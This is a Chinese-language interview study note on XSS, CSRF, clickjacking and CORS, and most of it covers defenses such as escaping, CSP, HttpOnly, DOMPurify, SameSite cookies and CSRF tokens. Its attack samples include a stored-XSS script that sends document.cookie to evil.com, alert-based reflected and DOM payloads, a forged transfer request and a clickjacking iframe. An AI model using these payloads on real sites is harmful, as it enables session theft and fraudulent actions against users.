# XSS & CSRF

> 面试必问的两种常见 Web 攻击。

## XSS（Cross-Site Scripting）跨站脚本攻击

### 三种类型

```html
<!-- ① 存储型 XSS -->
<!-- 攻击者把恶意脚本存到服务器 -->
<!-- 用户访问时，脚本被载入页面执行 -->

<!-- 例如：论坛评论框输入 -->
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>

<!-- 如果后端不做转义直接存储，其他用户访问时这段脚本被执行 → Cookie 泄露 -->

<!-- ② 反射型 XSS -->
<!-- 脚本通过 URL 参数带到服务端，反射回页面并执行 -->
<!-- url: https://example.com/search?q=<script>alert(1)</script> -->
<!-- 服务端直接把 q 原样输出到 HTML -->

<!-- ③ DOM 型 XSS -->
<!-- 纯前端问题，浏览器端 JS 操作导致的 -->
<!-- url: https://example.com#<img src=x onerror=alert(1)> -->
<div id="app"></div>
<script>
  // 危险：直接用 innerHTML 插入用户输入
  document.getElementById('app').innerHTML = location.hash
</script>
```

### 防御手段

```js
// ① 输入过滤 + 输出转义
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}

// ② HttpOnly Cookie → 最有效！
// Set-Cookie: token=abc; HttpOnly
// JS 无法读取 document.cookie → XSS 也无法窃取

// ③ CSP（Content Security Policy）
// HTTP 响应头：
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
// 或 HTML：
<meta http-equiv="Content-Security-Policy" content="...">
// 只信任指定来源的脚本

// ④ Vue 自动转义
// Vue 的 {{ }} 插值会自动转义 HTML
// v-html 才需要小心 → 绝对不要用 v-html 渲染用户输入！
```

### Vue 中的 XSS 防护

```html
<!-- ✅ 安全：{{ }} 自动转义 -->
<div>{{ userInput }}</div>

<!-- ❌ 危险：v-html 不转义 -->
<div v-html="userInput"></div>

<!-- ❌ 危险：dangerouslySetInnerHTML（React） -->
<!-- ❌ 危险：innerHTML / document.write -->

<!-- ✅ 如果必须插入 HTML，用 DOMPurify 过滤 -->
<script setup>
import DOMPurify from 'dompurify'
const safeHtml = computed(() => DOMPurify.sanitize(richText))
</script>
<template>
  <div v-html="safeHtml"></div>
</template>
```

---

## CSRF（Cross-Site Request Forgery）跨站请求伪造

### 攻击原理

```
① 用户登录 A 网站（example.com），Cookie 被浏览器保存
② 用户访问恶意网站 B
③ B 网站自动发起一个请求到 A 网站
   如：<img src="https://example.com/transfer?to=hacker&amount=10000">
④ 浏览器自动带上 A 网站的 Cookie
⑤ 服务端以为是用户本人操作 → 转账成功
```

### 防御手段

```yaml
① SameSite Cookie（现代浏览器默认）
  Set-Cookie: session=xxx; SameSite=Lax
  → 跨站请求不携带 Cookie
  → 最简单的防御方式

② CSRF Token
  服务端生成一个随机 Token，放在表单隐藏字段或 header 中
  每次请求带上 Token，服务端验证
  攻击者无法获取这个 Token

③ Origin / Referer 验证
  检查请求来源是否为合法域名
  Origin: https://example.com ✓
  Origin: https://evil.com ✗

④ 双重验证
  关键操作（转账、改密码）要求二次确认：验证码、手机验证码
```

### 在 Vue 项目中的应用

```js
// Axios 携带 CSRF Token
const http = axios.create({
  headers: {
    'X-CSRF-Token': getCookie('csrf_token')
  }
})

// 或者从 meta 标签读取
const token = document.querySelector('meta[name="csrf-token"]').content
```

---

## XSS vs CSRF

| | XSS | CSRF |
|:--|:--|:--|
| 攻击目标 | 用户浏览器执行恶意脚本 | 利用用户已登录身份发起请求 |
| 攻击方式 | 注入代码到页面 | 诱导用户点击/访问 |
| 利用的信任 | 用户对网站的信任 | 网站对用户浏览器的信任 |
| 核心防御 | 输出转义、CSP、HttpOnly | SameSite Cookie、CSRF Token |

---

## 其他安全相关

### 点击劫持（Clickjacking）

```html
<!-- 攻击者用透明 iframe 盖在诱饵按钮上 -->
<iframe src="https://bank.com/transfer" style="opacity:0;position:absolute;..."></iframe>
<button>点击赢 iPhone！</button>
<!-- 用户以为在点击赢手机，实际点了银行转账 -->

<!-- 防御：X-Frame-Options -->
// X-Frame-Options: DENY  → 禁止任何 iframe 嵌入
// X-Frame-Options: SAMEORIGIN → 只允许同源嵌入
```

### CORS 安全

```yaml
Access-Control-Allow-Origin: *
  → 不要在生产环境用 *，会暴露 API 给任意网站

敏感操作要验证 Origin/Referer
```